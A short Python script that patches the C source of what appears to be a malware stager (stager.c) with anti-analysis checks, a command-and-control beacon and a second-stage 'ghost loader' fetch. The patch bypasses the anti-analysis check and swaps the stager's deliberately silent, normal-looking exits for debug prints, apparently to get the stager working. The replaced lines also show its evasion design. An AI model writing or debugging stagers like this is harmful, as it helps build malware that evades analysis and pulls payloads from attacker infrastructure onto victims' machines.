import sys

with open('/app/stager/stager.c', 'r') as f:
    content = f.read()

content = content.replace("  aegis_result_t rc = aegis_aa_full_check();\n  if (rc != AEGIS_OK) {\n    /* Exit with code 0 — look like a normal program that finished */\n    return 0;\n", 
                          "  aegis_result_t rc = AEGIS_OK; //aegis_aa_full_check();\n  if (rc != AEGIS_OK) {\n    printf(\"FAILED AT PHASE 1\\n\");\n    return 1;\n")

content = content.replace("  rc = aegis_crypto_init(&crypto, NULL);\n  if (rc != AEGIS_OK) {\n    /* Silently fail */\n    return 0;\n", 
                          "  rc = aegis_crypto_init(&crypto, NULL);\n  if (rc != AEGIS_OK) {\n    printf(\"FAILED AT PHASE 2.1\\n\");\n    return 1;\n")

content = content.replace("  rc = aegis_c2_init(&c2, &crypto);\n  if (rc != AEGIS_OK) {\n    aegis_crypto_destroy(&crypto);\n    return 0;\n", 
                          "  rc = aegis_c2_init(&c2, &crypto);\n  if (rc != AEGIS_OK) {\n    printf(\"FAILED AT PHASE 2.2\\n\");\n    return 1;\n")

content = content.replace("  rc = aegis_c2_beacon(&c2, task_buf, sizeof(task_buf), &task_len);\n  if (rc != AEGIS_OK) {\n    /* C2 unreachable — clean up and exit silently */\n    aegis_c2_destroy(&c2);\n    aegis_crypto_destroy(&crypto);\n    return 0;\n", 
                          "  rc = aegis_c2_beacon(&c2, task_buf, sizeof(task_buf), &task_len);\n  if (rc != AEGIS_OK) {\n    printf(\"FAILED AT PHASE 3\\n\");\n    return 1;\n")

content = content.replace("  rc = aegis_c2_fetch_stage(&c2, &ghost_loader, &ghost_len);\n  if (rc != AEGIS_OK || !ghost_loader || ghost_len == 0) {\n    aegis_c2_destroy(&c2);\n    aegis_crypto_destroy(&crypto);\n    return 0;\n", 
                          "  rc = aegis_c2_fetch_stage(&c2, &ghost_loader, &ghost_len);\n  printf(\"FETCH STAGE RC: %d\\n\", rc);\n  if (rc != AEGIS_OK || !ghost_loader || ghost_len == 0) {\n    printf(\"FAILED AT PHASE 4\\n\");\n    return 1;\n")

content = content.replace("  /* Clean up crypto state */\n  aegis_c2_destroy(&c2);\n  aegis_crypto_destroy(&crypto);\n\n  return 0;\n}",
                          "  /* Clean up crypto state */\n  aegis_c2_destroy(&c2);\n  aegis_crypto_destroy(&crypto);\n\n  printf(\"STAGER SUCCESS!\\n\");\n  return 0;\n}")


with open('/app/stager/stager.c', 'w') as f:
    f.write(content)
print("Stager final patch applied!")
